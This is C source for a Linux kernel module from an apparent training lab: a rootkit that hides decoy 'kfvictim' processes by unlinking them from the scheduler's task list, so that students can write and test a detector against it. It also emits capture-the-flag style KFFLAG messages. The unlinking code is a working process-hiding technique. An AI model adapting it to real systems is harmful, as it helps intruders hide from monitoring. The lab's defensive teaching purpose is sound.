/*
 * kfvillain.c — the linux track's villain: a task-unlinking rootkit.
 *
 * GPL-2.0. Educational/defensive framing: ships in the buildroot guest as a
 * known quantity so students can write and verify a detector against it
 * (module m9). Hides GUEST_SEEDS["task-hide"].hiddenTasks decoy tasks by
 * unlinking them from the scheduler's task list — the Linux twin of DKOM.
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/kthread.h>

static struct task_struct *victims[8];
static int victim_count;

static int __init villain_init(void)
{
    struct task_struct *t;
    int hidden = 0;

    rcu_read_lock();
    for_each_process(t) {
        if (hidden >= ARRAY_SIZE(victims))
            break;
        if (!strncmp(t->comm, "kfvictim", 8)) {
            pr_info("kfvillain: candidate pid %d comm=%s\n", t->pid, t->comm);
            victims[hidden] = t;
            hidden++;
        }
    }
    rcu_read_unlock();

    victim_count = hidden;
    /*
     * Unlink from the tasks list; nr_threads is untouched — the discrepancy
     * the student's detector measures.
     */
    for (int i = 0; i < victim_count; i++) {
        pr_info("kfvillain: hiding pid %d comm=%s\n", victims[i]->pid, victims[i]->comm);
        list_del_rcu(&victims[i]->tasks);
    }
    synchronize_rcu();
    /* verify hide */
    {
        struct task_struct *t2;
        int remain = 0;
        rcu_read_lock();
        for_each_process(t2) {
            if (!strncmp(t2->comm, "kfvictim", 8))
                remain++;
        }
        rcu_read_unlock();
        pr_info("kfvillain: verify after hide: %d kfvictim remain (expected 0)\n", remain);
    }

    pr_info("KFFLAG: villain armed, %d tasks hidden\n", victim_count);
    return 0;
}

/*
 * Called through the student module's completion path once the detector has
 * measured the correct hidden-task count. The villain surrenders the secret.
 */
void kfvillain_reveal(void)
{
    pr_info("KFFLAG: kf-detector-ok\n");
}
EXPORT_SYMBOL_GPL(kfvillain_reveal);

static void __exit villain_exit(void)
{
    /* re-linking is left as an exercise for the cleanup script; guests are
     * disposable. */
    pr_info("kfvillain: unloaded (%d still hidden)\n", victim_count);
}

module_init(villain_init);
module_exit(villain_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("KF lab villain: task-list unliner for detection practice");
